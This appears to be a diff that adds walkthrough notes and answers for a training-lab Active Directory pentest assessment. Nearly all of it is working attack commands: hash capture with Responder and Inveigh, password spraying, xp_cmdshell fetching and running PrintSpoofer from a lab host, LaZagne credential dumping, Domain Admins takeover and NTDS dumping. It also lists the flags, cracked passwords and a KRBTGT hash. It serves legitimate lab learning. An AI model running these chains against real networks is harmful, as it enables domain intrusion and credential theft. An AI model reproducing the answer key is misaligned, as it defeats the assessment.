@@ -126,5 +126,217 @@ Question 11 -  Submit the contents of the flag.txt file on the Administrator des
 2) proxychains evil-winrm -i 172.16.7.3 -u CT059 -p charlie1 
 3) cd C:\Users\Administrator\Desktop + type flag.txt = acLs_f0r_th3_w1n!
 
+
+
 Question 12 -  Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise. -krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7eba70412d81c1cd030d72a3e8dbe05f::: 
 From regular ssh htb session -> crackmapexec smb -u CT059 -p charlie1 -d INLANEFREIGHT.LOCAL 172.16.7.3 --ntds -> AFTER adding CT059 to Domain Admins 
+
+
+
+
+
+🧠 Skills Assessment II – Cleaned Engagement Notes
+Engagement Premise:
+Client: Inlanefreight.local
+Objective: Internal pentest with full coverage of Active Directory misconfigs before M&A. You are provided a Parrot Linux VM already inside the internal network. No evasion/stealth required.
+
+🎯 Initial Access & Enumeration Setup
+Login via SSH
+ssh htb-student@10.129.32.184
+Password: HTB_@cademy_stdnt!
+
+Optional RDP Access:
+xfreerdp /v:10.129.2.44 /u:htb-student /p:HTB_@cademy_stdnt! /drive:shared,/home/htb-student/Desktop
+
+Determine Internal Network Range:
+ifconfig -a → 172.16.7.0/23
+
+Scan Internal Network:
+nmap -T5 -A 172.16.7.0/23
+Hosts found:
+
+172.16.7.3 - DC01.inlanefreight.local
+
+172.16.7.50 - MS01.inlanefreight.local
+
+172.16.7.60 - SQL01.inlanefreight.local
+
+172.16.7.240 - (unnamed)
+
+❓ Question 1 – Obtain a password hash for a domain user
+Answer: AB920
+
+Set up proxy:
+ssh -D 9050 htb-student@10.129.32.184
+
+Start Responder:
+sudo responder -I ens224
+
+View captured hash:
+/usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.7.3.txt
+
+Save hash to file → crack with Hashcat:
+hashcat -m 5600 ab920_hash /usr/share/wordlists/rockyou.txt
+
+❓ Question 2 – What is this user’s password?
+Answer: weasal
+Derived from the cracked hash above.
+
+❓ Question 3 – Submit flag from C:\flag.txt on MS01
+Answer: aud1t_gr0up_m3mbersh1ps!
+
+Verify WinRM access:
+crackmapexec winrm 172.16.7.50 -u AB920 -p weasal
+
+Connect with Evil-WinRM:
+evil-winrm -i 172.16.7.50 -u AB920 -p weasal
+
+Read flag:
+type C:\flag.txt
+
+❓ Question 4 – Password spray to find weak creds
+Answer: BRO86
+
+On Evil-WinRM session run:
+net accounts → No lockout = safe to spray
+
+Transfer PowerView & Kerbrute:
+
+SCP both to SSH machine
+
+Use xfreerdp to log into MS01 as AB920:
+
+
+xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal /drive:shared,/home/htb-student/Desktop
+Run PowerView in PS session:
+
+
+Import-Module .\PowerView.ps1
+Get-DomainUser | Select-Object samaccountname > adusers.txt
+Spray with Kerbrute:
+
+
+.\kerbrute_windows_amd64.exe passwordspray -d INLANEFREIGHT.LOCAL --dc 172.16.7.3 .\adusers.txt Welcome1
+❓ Question 5 – What is BRO86's password?
+Answer: Welcome1
+
+Validated via spray output or proxychains CrackMapExec.
+
+❓ Question 6 – Password from MSSQL connection string
+Answer: D@ta_bAse_adm1n!
+
+Enumerate SMB Shares:
+smbmap -u BRO86 -p Welcome1 -d INLANEFREIGHT.LOCAL -H 172.16.7.3 -R "Department Shares"
+
+Access it:
+
+
+smbclient \\\\172.16.7.3\\Department\ Shares -U 'INLANEFREIGHT.LOCAL\BRO86'
+cd \IT\Private\Development
+more web.config
+
+❓ Question 7 – Flag on SQL01
+Answer: s3imp3rs0nate_cl@ssic
+
+Connect with MSSQLClient:
+
+
+proxychains mssqlclient.py -dc-ip 172.16.7.3 INLANEFREIGHT.LOCAL/netdb:'D@ta_bAse_adm1n!'@172.16.7.60
+Upload & run PrintSpoofer:
+
+
+xp_cmdshell certutil -urlcache -split -f "http://172.16.7.240:8000/PrintSpoofer64.exe" C:\temp\PrintSpoofer64.exe
+xp_cmdshell C:\temp\PrintSpoofer64.exe -c "net user administrator Welcome1"
+Confirm login & grab flag:
+
+
+smbclient -U administrator \\\\172.16.7.60\\C$
+cd Users\Administrator\Desktop
+get flag.txt
+
+❓ Question 8 – Flag on MS01 as Administrator
+Answer: exc3ss1ve_adm1n_r1ights!
+
+Use PrintSpoofer to escalate from SQL box (already SYSTEM):
+
+Upload LaZagne.exe:
+
+
+Invoke-WebRequest -URI http://172.16.7.240:8000/LaZagne.exe -OutFile .\LaZagne.exe
+Run it to dump cleartext creds:
+
+
+.\LaZagne.exe all
+Extract Administrator NTLM hash or plaintext password.
+
+Use hash to login with Evil-WinRM:
+
+
+proxychains evil-winrm -i 172.16.7.50 -u Administrator -H <NTLM_HASH>
+Read flag:
+
+
+type C:\Users\Administrator\Desktop\flag.txt
+❓ Question 9 – User with GenericAll over Domain Admins
+Answer: CT059
+
+Run SharpHound:
+
+
+.\SharpHound.exe -c All --zipfilename enum.zip
+Transfer enum.zip to host and import into BloodHound.
+
+Use Shortest Path to Domain Admins query.
+
+Observe: CT059 → GenericAll → Domain Admins
+
+❓ Question 10 – Crack CT059’s password
+Answer: charlie1
+
+Use Invoke-Inveigh to capture hash:
+
+Upload and import:
+
+
+Import-Module .\Invoke-Inveigh.ps1
+Invoke-Inveigh -NBNS Y -LLMNR Y -ConsoleOutput Y -FileOutput Y
+Wait for a broadcast → hash for CT059
+
+Crack it:
+
+
+hashcat -m 5600 ct059_hash.txt /usr/share/wordlists/rockyou.txt
+❓ Question 11 – Flag on DC01 from CT059 → DA
+Answer: acLs_f0r_th3_w1n!
+
+Add CT059 to Domain Admins (via GenericAll):
+
+
+net rpc group addmem "Domain Admins" "CT059" -U INLANEFREIGHT.LOCAL/CT059%"charlie1" -S 172.16.7.3
+Login as CT059:
+
+
+proxychains evil-winrm -i 172.16.7.3 -u CT059 -p charlie1
+Read flag:
+
+
+type C:\Users\Administrator\Desktop\flag.txt
+❓ Question 12 – Submit KRBTGT hash
+Answer: krbtgt:502:aad3b435...:7eba70412d81c1cd030d72a3e8dbe05f:::
+
+Now that you’re DA → dump ntds:
+
+proxychains secretsdump.py INLANEFREIGHT.LOCAL/CT059:charlie1@172.16.7.3
+Find and extract the krbtgt user line.
+
+🧾 Final Thoughts for Reporting
+Structure each section with:
+Tool → Action → Output → Flag/Result
+
+Include mitigation tips where applicable in your final report.
+
+Mention tool failures or alternate strategies if any.
+
+
+
+
